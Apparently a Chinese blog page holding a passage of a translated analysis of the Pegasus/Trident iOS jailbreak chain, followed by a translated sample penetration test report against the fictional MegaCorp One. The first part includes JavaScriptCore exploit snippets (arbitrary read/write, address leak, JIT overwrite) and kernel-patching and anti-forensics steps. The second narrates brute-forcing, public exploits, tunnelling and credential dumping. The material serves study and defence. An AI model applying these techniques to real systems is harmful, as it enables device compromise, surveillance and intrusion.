serialize的使用方式与32Stage2中的类似。然后使用在建立内核执行原语（32位）中描述的相同机制来实现任意代码执行（通过执行任意ROP链）。 建立内核执行原语（32位）正如之前在Rooted Devices上安装内核访问处理程序中所解释的那样，实时时钟的getattr处理程序指向OSSerializer :: serialize，它允许clock_get_attributes的调用者将特制结构传递给OSSerializer :: serialize以便在内核空间中执行指令。要在内核空间内执行，用户区32Stage2进程必须具有以可靠的方式将数据传输到内核地址空间的方法。 32Stage2使用管道创建的管道集的方法来完成此任务。 在将电池时钟的新getattr处理程序建立为 _bufattr _cpx 之后，32Stage2有一个可靠的方法将DWORD从内核地址空间读入用户空间。32Stage2使用此功能来查找存储在内核中的addrperm值。addrperm重新定义数据传入用户区时在内核中的偏移量，以便混淆内核中数据的真实位置。如果获得该值，可以将内核地址反混淆到其真实地址值。32Stage2从生成的管道集中调用读取管道的fstat，然后计算stat结构的位置与内核地址空间之间的差异。然后将该值存储在全局变量中，供必须访问内核内存以执行代码的函数使用。 每当32Stage2想要在内核中执行代码时，以下数据结构将写入生成的管道集中write pipe： [00] argument 1 [04] argument 2 [08] address of cpde execute 为了调用数据偏移量8中指定的函数，另一个DWORD被预先添加到数据中并传递给实时时钟的getattr处理程序（通过OSSerializer :: serialize访问），它在调用要执行的函数地址之前将参数1放入R3和参数2放入R1。通过将未使用的DWORD添加到数据结构中，该数据块成为OSSerializer的vtable替代品。该技术用于32Stage2中的两个不同函数。 一个函数允许任意内核函数调用，另一个函数用于将DWORD值写入内核地址空间。 修补内核以允许内核端口访问由于能够在内核地址空间内读取，写入和执行任意位置，下一步是通过内核端口获得对内核的更直接访问。如果使用PID值0调用，则 _for_pid 会返回错误。为了绕过这种保护，第2阶段修改了task_for_pid中的四个不同位置。在开始修改task_for_pid之前，阶段2确定需要修该改的区域是否在可读取/执行的内存区域内。如果内存不可写，则第2阶段将直接修改内存区域的权限以允许写访问，然后使dcache无效并刷新数据和TLBs指令以确保内存区域进行权限更新。 修改task_for_pid以允许调用者获得内核的端口后， 在调用assert回调和退出之前，第2阶段将尝试通过调用task_for_pid（mach_task_self，0，＆port）来获取五次内核端口，每次尝试之间有100次毫秒延迟。 阶段三：提权和实现越狱本节介绍在第2阶段执行的最终步骤，以获取iPhone上的root访问权限，禁用代码签名，然后实现越狱。 此阶段利用最终的Trident漏洞，该漏洞会造成内核内存损坏导致越狱（CVE-2016-4656）。 修改系统以提权32Stage2的下一步是在受害者的手机上获得root访问权限。如果第2阶段进程没有以root用户身份运行（UID = 0），在非越狱手机上不可能以root运行，第2阶段会修补setreuid功能跳过对提权的检查。若对setreuid的修改完成，该函数最多被调用五次（每次调用之间有500ms的延迟），直到setreuid（0,0）返回成功。在五次尝试之后（或在成功的setreuid调用之后），修改后的setreuid会给出相反的结果。最后检查进程的用户值（UID）以确保它确实是root（0）。 如果函数getuid返回0以外的任何值，则调用assert并退出阶段2。 阶段2通过实时时钟clock_get_attributes调用内核函数kauth_cred_get_with_ref，以便接收主线程的凭证。在此之后，第2阶段将找到mac_policy_list，其中包含当前加载到iOS内核中的访问控制策略模块列表。阶段2检查列表，查找以名称“Seat”开头的模块，可参考“Seatbelt沙箱策略”。如果未找到策略模块，则阶段2调用断言回调并终止。但是，如果找到该模块，则会读取并修改mpc_field_off，以允许当前进程更大程度地控制受害者的iPhone。 因为可访问内核端口并且删除了将阻止第2阶段执行通常被沙箱策略阻止的权限操作的限制，阶段2不再需要实时时钟的getattr处理程序。为了确保将来对此处理程序的调用不会使手机崩溃，将修改getattr函数指针以指向指令：BX LR这个新的处理函数有效地将未来对实时时钟的getattr调用转换为NOP。这可能是为了确保将来调用getattr处理程序（通过某些其他进程）不会产生意外后果并导致内核崩溃。 禁用代码签名默认情况下，标准iPhone上的iOS将阻止未签名的代码通过正常方式运行，例如execv或系统调用。同样，通过将文件系统设置为只读，可以防止对根文件系统的修改。这些情况将阻止第2阶段执行越狱程序，并将阻止越狱程序（如果它激活）修改系统。第2阶段修改了几个内核函数和两个内核扩展（kext），以允许这些禁止的操作。第2阶段首先找到com.apple.driver.AppleMobileFileIntegrity和com.apple.driver.LightweightVolumeManager的kext。com.apple.driver.AppleMobileFileIntegrity（AMFI）扩展程序负责实施iOS的代码签名功能。com.apple.driver.LightweightVolumeManager扩展负责主存储设备的分区表。阶段2通过调用OSKextCopyLoadedKextInfo来定位每个扩展，该函数返回含有扩展信息的字典对象。在字典中的是当扩展被调用时的加载偏移量，阶段二通过添加一已知的偏移量将其放入内核地址中。 使用AMFI的内核地址，阶段2定位以下全局变量：amfi_get_out_of_my_waycs_enforcement_disable这两个变量在设置好后会禁用AFMI并禁用代码签名。然后，阶段2设置另外两个全局变量：debug _ flags和DEBUGflag。 这两个变量允许对受害者的iPhone进行调试权限，进一步减少沙箱（SEATBELT）对设备施加的限制。 接下来，第2阶段修改内核函数vm_map_enter和vm_map_protect，以便在虚拟内存管理器中禁用代码签名验证（可以分配RWX区域）。在此之后，第2阶段修改LightweightVolumeManager中的_mapForIO函数，然后修改内核函数csops以禁用更多的代码签名保护。 重新安装驱动器为了越狱设备，必须拥有根文件系统写权限。阶段2通过对/ sbin / launchd调用访问函数来测试根文件系统的可写性，以确定阶段2是否具有对根文件系统的写访问权。如果文件是只读的，则第2阶段修补内核函数_ mac _ mount以禁用保护策略，该策略阻止将文件系统重新安装为读/写，然后通过调用mount(“hfs”, “/”, MNT _ UPDATE ,mountData)将root文件系统重新安装为读/写，其中mountData指定/ dev / disk0s1s1设备。 如此编写使得它只能在iOS 9系列iPhone上运行，但代码存在表明它曾经在较旧的iOS版本上使用过。作为支持此声明的证据，在第2阶段重新安装根文件系统后会调用一个函数，如果它在iOS 7，iOS 8或iOS 9上运行，则修改其执行路径。根据iOS版本，函数在/ bin / launchctl（适用于iOS 7和8）或/ bin / launchd（适用于iOS 9）上调用fsctl。fsctl将修改低磁盘空间警告阈值以及极低磁盘空间警告阈值，分别将值设置为8192和8208。 清理由于Safari中允许任意代码执行的漏洞，第2阶段被激活。作为第2阶段在实现越狱之前执行的最后一项活动之一，第2阶段尝试通过清理Safari中的历史记录和缓存文件来覆盖其感染向量。清除Safari浏览器历史记录和缓存文件的过程非常简单，并且特定于iOS版本。 对于iOS 8和iOS 9（如果未在iOS 9上运行，第2阶段将在开始时终止），将从受害者的iPhone中立即删除以下文件以删除浏览器和缓存信息： • /Library/Safari/SuspendState.plist • /Library/Safari/History.db • /Library/Safari/History.db-shm • /Library/Safari/History.db-wal • /Library/Safari/History.db-journal • /Library/Caches/com.apple.mobilesafari/Cache.db • /Library/Caches/com.apple.mobilesafari/Cache.db-shm • /Library/Caches/com.apple.mobilesafari/Cache.db-wal • /Library/Caches/com.apple.mobilesafari/Cache.db-journal • (files in the directory) /Library/Caches/com.apple.mobilesafari/fsCachedData/ 对于iOS 7，将删除以下文件： • /Library/Caches/com.apple.mobilesafari/Cache.db • /Library/Caches/com.apple.mobilesafari/Cache.db-shm • /Library/Caches/com.apple.mobilesafari/Cache.db-wal • /Library/Caches/com.apple.mobilesafari/Cache.db-journal 最后调用sync，以确保将删除写入磁盘。 下一阶段安装再次给出使用最初针对较旧的iOS版本的代码的证据，主线程调用的下一个函数进行解压缩并将两个文件放到受害者的文件系统上。以下代码段说明了Stage 2如何确定越狱二进制文件在受害者设备上的位置： if ( ( unsigned int) ( majorVersion -8 )) { if ( majorVersion ==7 ){ pszJBFilenamePath = &quot;/bin/sh&quot;; if( flag ) pszJBFilenamepath = &quot;/private/var/tmp/jb-install&quot;; } else{ assert(); writeLog(3, &quot;%.2s%5.5d\\n&quot;, &quot;bh.c&quot;, 134); exit(-1); pszJBFilenamePath =0; } } else { pszJBFilenamePath = &quot;/sbin/mount_nfs.temp&quot;; } 代码片段显示，对于iOS版本7，下一阶段二进制文件的安装路径是/ bin / sh或/ private / var / tmp / jb-install（如果flag为非零）。对于早于7的iOS版本，将调用断言回调并终止程序。 对于iOS 8及更高版本，安装路径指定为/ sbin / mount _ nfs.temp。 包含下一阶段二进制的数据blob的大小被验证为非零。如果大小为零，则发生断言回调并终止第2阶段。然后，阶段2使用BZ2 _ * API函数将数据解压缩为两个文件：第一个文件是下一个阶段的二进制文件，对于iOS 9，它存储在/ sbin / mount _ nfs.temp中。 第二个文件是配置文件，存储在/ private / var / tmp / jb _ cfg中。 在控制返回主线程之前，这两个文件的权限更改为0755（使文件可执行）。 Stage 2在终止之前调用的最终函数负责移动上一步骤中放下的二进制文件。对于iOS版本8和9，文件/ sbin / mount _ nfs.temp重命名为/ sbin / mount _ nfs。如果受害者手机上的iOS是iOS 9，则会在重命名操作之前尝试删除/ sbin / mount _ nfs。重命名文件后，调用assert回调函数，然后调用exit函数，终止Stage 2。 一旦执行返回主线程，第2阶段将以静默方式终止 现有的越狱检测如前所述，Stage 2二进制文件以两种不同的模式运行。第一个已经讨论过，其构成了一个完整的iOS漏洞利用和越狱。 第二个是在已经越狱的系统上运行Stage 2二进制文件时所采用策略。在第二模式下，第2阶段只是利用现有的越狱后门来安装Pegasus特定的内核补丁。 为了确定设备是否已经越狱，第2阶段尝试利用常见的越狱后门获取进入iOS内核的有效机器端口。只需通过调用task _ for _ pid并将PID值设置为0来执行此检查。 修改task _ for _ pid是iOS越狱使用的常见后门机制，它使用户模式进程有直接内核内存访问的权力。iOS通常不允许使用PID为0的task _ for _ pid。如果task _ for _ pid返回有效的任务端口，Stage 2进程就可以提升对内核的访问权限，那么就可以放弃前面描述的权限提升步骤。 阶段2还检查/ bin / sh在不在。在未越狱手机上，这个二进制文件永远不应该存在。当阶段2检测到此二进制文件的存在时，它假定现有的越狱程序与Pegasus不兼容或者所有必需的内核补丁已经到位并且不需要进一步的操作。当在设备上存在/ bin / sh时，阶段2不用进行攻击直接退出即可。 四：Pegasus持久性机制本节详细介绍了Pegasus通过Trident漏洞进行攻击后保留在设备上的持久性机制，并在每次设备重新启动时继续执行未签名的代码。 Pegasus持久性机制Pegasus使用的持久性机制在每次设备启动时可靠地执行未签名的代码（并最终执行内核漏洞以再次越狱设备）依赖于两个不同问题的组合。 第一个问题是plist中存在rtbuddyd服务（在设备启动时启动）。请注意，在iOS 10之前，rtbuddyd存在于某些iPhone设备上，例如iPhone 6S，但不存在于iPhone 6等其他设备上。因此，任何可以复制到指定路径（/ usr / libexec / rtbuddyd）的已签名二进制文件都将在引导时使用plist中指定的参数（特别是“--early-boot”）执行。 &lt;key&gt; rtbuddy&lt;/key&gt;&lt;dict&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;rtbuddy&lt;/string&gt;&lt;string&gt;--early-boot&lt;/string&gt;&lt;/array&gt;&lt;key&gt;PerformInRestore&lt;/key&gt;&lt;true/&gt;&lt;key&gt;RequireSucess&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;/usr/libexec/rtbuddy&lt;/string&gt;&lt;/dict&gt; 由于此行为，系统上的任何已签名二进制文件都可以在引导时使用单个参数执行。通过在当前工作目录中创建名为--early-boot的符号链接，可以将任意文件作为第一个参数传递给已复制到rtbuddyd位置的任意已签名二进制文件。 此持久性机制中利用的第二个问题是JavaScriptCore二进制文件中的漏洞。Pegasus利用前面描述的方法，通过将文件复制到/ usr / libexec / rtbuddyd来执行jsc二进制文件（JavaScriptCore）。然后可以通过创建名为--early-boot的符号链接来执行任意JavaScript代码，该符号链接指向要在引导时执行的代码文件。然后Pegasus利用jsc二进制文件中的错误转换来执行未签名的代码并重新利用内核。 JavaScriptCore内存损坏问题该问题存在于JavaScript绑定的setImpureGetterDelegate（）中（由functionSetImpureGetterDelegate支持）。 12345678910111213EncodeJSValue JSC_HOST_CALL functionSetImpureGetterDelegate(ExecState* exec)&#123; JSLockHolder lock(exec); JSValue base = exec-&gt;argument(0)； if(!base.isObject()) return JSValue::encode(jsUndefined()); JSValue delegate =exec-&gt;argument(1); if(!delegate.isObject()) return JSValue::encode(jsUndefined()); ImpureGetter* impureGetter = jsCast&lt;ImpureGetter*&gt;(asObject(base.asCell())); impureGetter-&gt;setDelegate(exec-&gt;vm(), asObject(delegate.asCell())); return JSValue::encode(jsUndefined());&#125; 这个绑定有两个参数：第一个是ImpureGetter，第二个是将被设置为ImpureGetter delegate的通用JSObject。这个问题是由于缺乏验证，JSObject作为第一个参数实际上是一个格式正确的ImpureGetter。当另一个对象类型作为第一个参数传递时，对象指针将不正确地向下转换为ImpureGetter指针。 随后，当通过setDelegate（)设置m_delegate时，指向作为第二个参数传递的JSObject的指针将写入与m_delegate对齐的偏移量（16个字节到提供的对象中）。此问题可用于创建一个原语，允许将指向任意JSObject的指针写入16个字节到任何其他JSObject中。 攻击Pegasus利用此问题在iOS应用程序执行时实现未签名代码执行。为了获得对执行流程的控制，该攻击利用了许多DataView对象。使用DataView是因为它们提供了一种简单的机制来读取和写入向量中的任意偏移量。DataView对象在16字节偏移处有一个指向缓冲区的指针。利用这些损坏的DataView对象，漏洞利用程序安装获取任意本机代码执行权所需的工具 - 即读/写原语以及暴露任意JavaScript对象地址。完成此设置后，漏洞利用程序就可以创建包含本机代码payload的可执行映射。 以下部分详细介绍了此过程的各个阶段。 获取任意读/写原语可以使用以下代码片段获取用于DataView对象的任意偏移量的读/写原语。123456var dummy_ab = new ArrayBuffer(0x20);var dataview_init_rw = new DataView(dummy_ab);...var dataview_rw = new DataView (dummy_ab);...setImpureGetterDalagate(dataview_init_rw, dataview_rw); 首先，使用虚拟ArrayBuffer作为两者的后备向量创建两个DataView。接下来，利用指向dataview_rw的指针来利用该问题来破坏dataview_init_rw的m_vector成员。对dataview_init_rw 后续读取和写入，DataView会让dataview_rw的任一成员泄露或重写。接下来，对该对象的控制用于获得整个进程存储器的读/写原语。123456789var DATAVIEW_ARRAYBUFFER_OFFSET = 0x10;var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + 4;var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + 4;var FAST_TYPED_ARRAY_MODE = 0;dataview_init_rw.setUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, 0 , true);...dataview_init_rw.setUnit32(DATAVIEW_BYTELENGTH_OFFSET, 0xFFFFFFFF , true);...dataview_init_rw.setUnit8(DATAVIEW_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, true); 向dataview_rw DataView中写入三个偏移量。首先，指向后备向量的指针指向零地址。然后将DataView的长度设置为0xFFFFFFFF，有效地设置DataView以映射进程的所有虚拟内存。最后，将模式设置为简单类型（即FastTypedArray），允许在给定虚拟地址的情况下将偏移量计算到DataView中。dataview_rw DataView现在通过它公开的getType和setType方法提供任意读/写原语。 泄漏对象地址所需的最后一个原语可以暴露任意JavaScript对象的虚拟内存地址。使用上面利用的相同问题来泄漏单个对象的地址而不是暴露整个存储器空间来实现该原语。12345678var dummy_ab = new ArrayBuffer (0x20);...var dataview_leak_addr = new DataView ( dummy_ab);var dataview_dv_leak = new DataView (dummy_ab);setImpureGetterDelegate (dataview_dv_leak, dataview_leak_addr);...setImpureGetterDelegate (dataview_leak_addr, object_to_leak );leaked_addr = dataview_dv_leak.getUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, ture); 同样，使用虚拟ArrayBuffer作为两者的支持向量创建两个DataView。接下来，用指向dataview_leak_addr的指针来利用该问题去破坏dataview_dv_leak的m_vector成员。为泄漏任意JavaScript对象的地址，第二次触发该问题。这次，dataview_leak_addr DataView的m_vector被需泄露的对象的地址代替。最后，可以读取dataview_dv_leak DataView中偏移16个字节的dword以获取目标对象的地址。 未签名的本机代码执行如第1阶段Safari漏洞利用中所使用的那样，Pegasus在本攻击中使用相同的机制来获取代码执行权限。该漏洞创建了一个可执行映射，其中包含要执行的shellcode。为了实现这个目的，创建了一个JSFunction对象（含有数百个空的try / catch块，稍后将被覆盖）。为了帮助确保JIT将JavaScript编译为本机代码，随后会重复调用该函数。鉴于JavaScriptCore库的性质，此JIT编译的本机代码将驻留在映射为读/写/执行的内存区域中。12345678var body =' 'for (var k=0; k&lt;0x600; k++)&#123; body+= 'try () catch(e) ();';&#125;var to_overwrite = new Function('a', body);for (var i=0;i&lt;0x10000; i++)&#123; to_overwrite();&#125; 然后可以读取此JSFunction对象的地址，并且可以读取各种成员以获取RWX映射的地址。然后用shellcode覆盖JITed try / catch块，并且可以简单地调用to_overwrite（）函数来实现任意代码执行。","categories":[],"tags":[{"name":"ios","slug":"ios","permalink":"http://finsenty54.github.io/tags/ios/"}]},{"title":"penetration test report interpretation","slug":"penetration-test-report-interpretation","date":"2019-03-28T08:45:25.000Z","updated":"2019-04-26T07:52:02.000Z","comments":true,"path":"2019/03/28/penetration-test-report-interpretation/","link":"","permalink":"http://finsenty54.github.io/2019/03/28/penetration-test-report-interpretation/","excerpt":"老师布置的一项任务，deploy丰富博客 渗透测试报告目录执行总结 3结论总结 3攻击记叙 3远程系统调查 3管理员网络服务器界面攻击 5命令解析器到管理服务器 7提权 9JAVA客户机攻击 9升级为本地管理员 11深包检测规避 12","text":"老师布置的一项任务，deploy丰富博客 渗透测试报告目录执行总结 3结论总结 3攻击记叙 3远程系统调查 3管理员网络服务器界面攻击 5命令解析器到管理服务器 7提权 9JAVA客户机攻击 9升级为本地管理员 11深包检测规避 12Citrix环境下的漏洞 14升级为域管理员 17总论 19建议 20风险等级 20附录A：漏洞细节及减轻危害 21风险等级范围 21默认的或弱的凭证 21密码重用 21共享本地管理员密码 21补丁管理 21DNS区域传送 22默认APACHE文件目录 22附录B:关于Offensive Security 22 执行总结为了检测经过一次蓄意攻击中后会出现什么问题，MegaCory One授权Offensive Security进行了这一次的渗透测试。我们有一个准则，就是为了模拟一个蓄意的攻击者，这个攻击者热衷于攻击MegaCory One的系统，并且我们要达到下列目的：  确认远程攻击者能否破坏MegaCory One的防御系统 确认攻击所带来的影响: 公司重要数据是否泄露 MegaCory One信息系统内部结构是否泄露以及是否可用 我们的工作主要是在确认和利用系统漏洞上，远程攻击者可以通过这些漏洞以未授权的方式获得一些重要数据。这些攻击方式可能一个只会上网的人也可以用。评估是按照NIST SP 800-115 中的标准下进行的，并且所有的测试都是可控的。 结论总结对于MegaCorp One公司系统的第一次检测，就发现了一个错误配置的DNS服务器，其允许进行区域传送。这个漏洞给检测提供了许多可供攻击的主机。检查了这些主机后，发现一个受密码保护的网站服务器界面。我们通过穷举攻击爆出了密码从而能够进入网站，在建了符合网站密码的格式的随机字母表后。 这个管理界面非常脆弱，因为有一个远程代码注入漏洞，通过这个漏洞可以获得对底层操作系统访问的权限。因为没有正确的系统更新，而使最初的小问题变成了大问题。进一步检查后，发现管理用户可以在这个受损的服务器上运行着一个JAVA程序。当我们上传了恶意代码后，取得了访问权限。 利用这个服务器爆出的密码，我们能够访问先前不能访问的资源。这使得我们能够使用本地账户就可以登录许多的WINDOWS主机，一个CITRIX的服务器，还有对于WINDOWS活动目录完整的权限。通过将恶意流量封装进协议里，现有的恶意流量控制就可以避开。 攻击记叙远程系统调查为了更好的评估，MegaCorp One提供了很少的信息，除了组织的域名:megacorpone.com。这样做的目的是为了更符合一个没有得到内部信息的攻击者。为了避免攻击其他组织的系统，在攻击前，所有系统都进行了所有权验证。 我们检查了megacorpone.com域名的DNS服务器，查看有没有可能的攻击目标。 Figure 1-通过收集域名的信息找到了三个DNS服务器 利用这几个服务器，我们试着去进行区域传输。发现ns2.megacorpone.com的区域传输配置错误。这暴露了许多的主机名和其相关的IP地址，这非常有帮助。（Figure 2）区域传输提供给攻击者详细的信息，这个组织的职能，网段。详细请看附录A。 Figure 2-一个错误配置的DNS服务器，允许完整的五限制的区域传输 这些识别出的主机提交给了MegaCorp One确认，确定整个50.7.67.X网段都要在评估范围内。这些主机会被扫描，接着列举出所有正在运行的服务。为了确定这些服务器潜在的漏洞，它们会被仔细的检查。 通过枚举技术和网络扫描，可以建立一个映射MegaCorp One网络的结构。 在Figure 3中展示了目标网络结构。例如深包检查这样的额外控制细节，会在接下来的评估中提到，这里为完整性，先说一点。 Figure 3-目标网络 管理员网络服务器界面攻击Admin.megacorpone.com服务器在81端口上运行着Apache服务。通过站点的根URL访问，发现了一个空白页面。接下来，进行一次快速的枚举扫描，以期找到公用目录和文件。（Figure 4） Figure 4-admin.megacorpone.com的枚举攻击揭露了网站的文件结构 扫面的结果显示没有改变Apache公共默认目录(详细请看附录A)，我们确定/admin是唯一可通过身份验证的目录。（Figure 5） Figure 5-admin目录受密码保护 我们定作了一个基于该网站内容的字典文件，为了暴力破解密码。最初的字典包括了331个特意字符串，通过几轮置换，形成了有16201个字符串的字典文件。用admin的用户名和这个字典来暴力破解。 Figure 6-使用字典攻击来获得管理员密码 暴力攻击找到了admin用户的密码”nanotechnology1”。利用这个账户就能一未授权的方式得到网站受保护部分的内容。（Figure 6）详细请看附录A，怎么利用这个漏洞。 这里面有一个SQLite Manager服务界面，无需任何凭证就可以访问。利用这个界面，发现支持phpSQLiteCMS实例的数据库。http://phpsqlitecms.net/ Figure 7-网站运行着SQLite数据库 通过这个界面就可以获得数据，比如用户名，以及相关的密码哈希值。（Figure 8） Figure 8-缺少额外的设置，攻击者可以很方便地获得数据，从”userdata”这个数据库 表中的密码hash值不符合任何标准的格式。使用一个叫”phpselitecms”的软件，查看源代码以确定hash值是怎么产生的。可以看到这个函数的功能是hash账户的密码。 Figure 9-查看源码发现密码hash生成算法 知道了密码hash的格式，还有随意生成的十个字符的salt值，可以将这些hash值转变成等价的加了salt的SHA1值，进行暴力攻击。 得到了两个明文密码，尽管不是立马就有用，但可能在组织里其他的系统中可以用到。 命令解析器到管理服务器先前发现的SQLite Manager有一个著名的代码注入漏洞。(https://www.exploit-db.com/exploits/24320)利用这个漏洞可以获得shell，进入网站服务器用户使用的系统。使用一个改良过的公共漏洞利用库，可以得到admin.megacorpone.com服务器上有限的交互权。详细请看附录A. Figure 10-利用一个公开的可用的SQLite漏洞，就能以未授权的方式进入系统 Figure 11-只能取得www-data这个用户的权限 MegaCorp One使用的SQLite Manager的版本和该存在该漏洞的版本有一些不同。尽管使用的版本也同样存在相同的底层问题，但在没有修正的情况下，这个漏洞不能发挥作用。所以我们添加了功能，让它支持HTTP认证，适合于新版本的SQLite Manager。这个新的漏洞随后会发布出去。 在图12中可以看到方案的内容。 Figure 12-网络服务器的攻击方案 提权当得到了底层系统的交互权后，我们继续寻找可以提升权限的方法。随后，找到了一个可以可以利用的提权的漏洞。(http://www.exploit-db.com/exploits/18411/)详细信息请看附录A。 Figure 13-使用一个提权的漏洞，该主机没有打补丁，所以可以用 因为上传了漏洞利用工具，所以让利用该漏洞有一定的可行性。如果没有这些工具，还是由可能成功提权的，尽管这么做工作量会大大增加。 服务器有许多漏洞，可以给攻击者很多机会，如果不补救的话。有了管理员的权限，攻击者可以做很多的事，既可以攻击MegaCorp One自己，也可以攻击它的用户。当然，很大的可能是同时做这两件事情。 JAVA客户机攻击登录管理员账户，分析该系统。找到了网站的一个私有部分，这个部分给一些特殊的工作站运行一个Java小程序。这个有问题的网段后来被发现是MwgaCorp One的管理网段。 Figure 14-Htaccess规则暴露了该网络的一个子网 通过查看log文件和Java小程序的运行方式，发现这个程序给MegaCorp One子网内部用户提供了管理员功能。这对攻击者来说非常有利，因为它提供了进入内网的可能方法，如果没有这个程序，进入内网会很困难。 获得了MegaCorp One的许可后，我们添加了一个可被客户机下载的小程序。攻击的原理是让客户机信任这个程序，允许运行，就可以连接到其他的客户机。这是普通的社会工程攻击的衍生品，所谓社会工程学攻击，就是让受害者主动去运行一个有害的程序。在这个例子中，不用去误导受害者，因为这个程序早已被认为是可信的。 正如所料，可以连接上其他客户机。 Figure 15-利用恶意的java小程序，可以操纵主机 在适当的地方实施该方案，可以得到管理员网络的系统权限，见图16。 Figure 16-Java小程序成功攻击 升级为本地管理员Java小程序的攻击只能提供一般用户的权限。为了能做更多的事，需要逐步提升权限，成为域管理员。首先，要获得本地管理权限。要达成这一目的，先检查系统看看有什么漏洞。 发现一个组策略首选项文件，其允许用户解密本地管理员密码。(http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)详情请看附录A。 Figure 17-利用这个漏洞，可以获得域控制器的Groups.xml文件 Figure 18-在Groups.xml中包含加密的本地管理员密码 Figure 19-使用Microsoft发布的加密密钥，这个加密密码很容易解密 使用这个明文密码，得到客户机的本地管理员权限。 深包检测规避当尝试建立进入受损系统的附加层时，遇到了进攻性出口过滤。这还是第一次碰到，当为Microsoht远程桌面协议建立加密的出口隧道。 Figure 20-初步尝试建立RDP的出隧道被出口过滤系统阻止 另外，当尝试连接攻击者的在80端口上的SSH服务器时，发现网络协议强制执行。我们创建了一个隧道来避开过滤，这个隧道有个运行的meterpreter会话，允许获取攻击者分享的文件。用这个会话在受损主机上用本地管理员权限运行windows SHELL。在这个shell里，执行一段额外的meterpreter关键代码。 Figure 21-通过最初的meterpreter会话建立端口转发， 可以直接访问受损主机 Figure 22-用这个新建立的连接来获得主机的shell Figure 23-在10.7.0.22上用本地管理员权限建立一个meterpreter shell 有了这个meterpreter shell，就可以利用HTTP-Tunnel，这是一个开源程序，（http://http-tunnel.sourceforge.net/）去封装HTTP负载内的任意流量。比如封装攻击者和主机的远程桌面连接数据。这之后，我们就可以得到完整的访问方式，而不仅仅是命令行。远程桌面连接是用“mike“这个用户的密码创建的，”mike“的密码就是之前从SQLite Manager发现的。详情请看附录A。 Figure 24-通过http隧道屏蔽过滤协议，建立远程桌面连接 此时，MefaCorp One的网络已被完全攻陷，如图25所示。我们能够以控制台的权限访问一台Megacorp One信任的电脑。只是访问受限，因为是靠一个无特权的域用户，和一个本地管理员账户。 Figure 25-到达管理员子网 Citrix环境下的漏洞我们用远程桌面访问方式进入内部网络，继续扫描以发现有价值的目标。找到了一个Citrix的服务器，在受损主机上它被设置成主页。使用和建立远程桌面连接相同的证书，成功登录Citrix。 Figure 26-发现一台支持ie的Citrix服务器 此Citrix环境说明“ie“是唯一可使用的程序。这种做法被很多组织采用来限制进入Citrix服务器底层的操作系统。但是有很多的方法可以绕过限制。这里，我们用”Save“这个对话框生成一个批处理文件，其能让我们使用Powershell。 这样做可能成功，因为“Save”对话框的操作方式大致相同，都是“Windows Explorer”的文件管理窗口。 Figure 27-使用Save对话框有可能突破Citrix环境下的限制 Figure 28-在Citrix上创建有Powershell程序的批处理文件 Figure 29-执行Pwershell突破Citrix的限制 Powershell也可以用来下载恶意的代码，这些代码创建底层服务器的meterpreter会话。 Figure 30-Powershell允许终端用户接受任意源的文件，包括远程网络地址 利用Save对话框运行任意可执行的代码，可以和之前的发现结合在一起，之前发现了本地账户密码，可以以管理员的权限执行程序。这就取得了这个系统的完整的管理员控制权。详情请看附录A。 Figure 31-攻击者利用管理员密码以管理员权限执行恶意代码 Figure 32-完成Citrix服务器的完全控制 Figure 33-在管理员内网中添加了一台主机 升级为域管理员有了这台受损Citrix服务器，我们试着在内存中搜索密码。Citrix服务器是这种攻击了的理想的候选，因为可以操作很长时间，而不用重启还有为大量用户提供服务。 我们用Windows Credential Editor这个工具来得到内存中的密码，因为它可以运行在64位的系统上且不会产生错误。 Figure 34-用Windows Credentials Editor得到服务器上的明文密码 这个工具爆出了很多的密码，包括Windows域管理员的密码。详情请看附录A。为了使恢复出来的凭证有效，我们用域管理员权限创建新的远程桌面连接会话。 Figure 35-域管理员证书有效此时，可以控制整个Windows域了。一个恶意攻击者有许多的工具可以用，包括： 在Windows系统上利用组策略上传后门程序。 对任何使用Windows身份验证的系统上存储的所有数据进行排除。 销毁任何以及所有网络资源。 有目的性的攻击MegaCorp One任一职员，通过信息收集工具，例如可以辨认个人信息的keystroke loggers 泄露对MegaCorp One信任的伙伴或支持组织的系统进入方式，便可以展开攻击 可以确定，这些步骤是可行的，且可以在当前环境之外使用。很明显，已经攻陷了整个MegaCorp One域，本地所有系统已经失去了一体性。 Figure 36-攻陷域 总论MegaCorp One有一系列的配置错误，而使关键公司资产泄露。如果一个恶意的组织利用这些错误，会产生恶劣的影响。现有的关于密码重用，上传控制的策略还不完善，不能消除漏洞发现产生的影响。 这次渗透测试的具体目标如下： 确认远程攻击者能否攻破MegaCorp One的防御系统 确定安全漏洞的影响： 组织信息的机密性 MegaCorp One信息系统的内部基础结构和可用性 这次渗透测试完成了这些目标。一次攻击就可以获得所有的联合资产。许多被认为是小事的问题会被一起利用，造成了系统的沦陷。值得注意的是，整个Megacorp One安全基础设施的崩溃很大程度上归因于对网络边界和主机级别的访问控制不足。需要引进有效的网络分层系统以减轻因整个Megacorp One基础设施的级联安全故障所产生的影响。 建议因为这次渗透暴露了整个系统架构，所以合适的资源分配可以确保修补工作可在短时间内完成。虽然需要修复的漏洞的完整表单不会提供，但一些高危漏洞需要说明。 安全建议如下： 确保组织的任何地方都使用了强凭证。在系统的不同安全层级上使用弱密码和相同的密码，会使攻击更加容易。可以参考NIST SP 800-11（http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdf）来制定企业的密码条款。虽然这个问题存在不广，但仍然是个问题，需要解决。 建立信任带。在内网中合适的地方建立信任逻辑边界。每个逻辑信任部分应相互联合，不能轻易破坏而连上其他部分。所以要使用不同的管理员账号，这样某一部分受损了，但不会影响到其他部分。 在所有系统中实行变更控制：在不同的系统中都发现了配置错误和上传漏洞。通过变更控制可减轻这些漏洞带来的风险。 实施补丁管理程序：按照NIST SP 800-40（http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdf）来创建一个补丁管理程序，这对可持续的安全环境来说是一个重要组件。这将有助于限制由于未修补而导致的攻击。 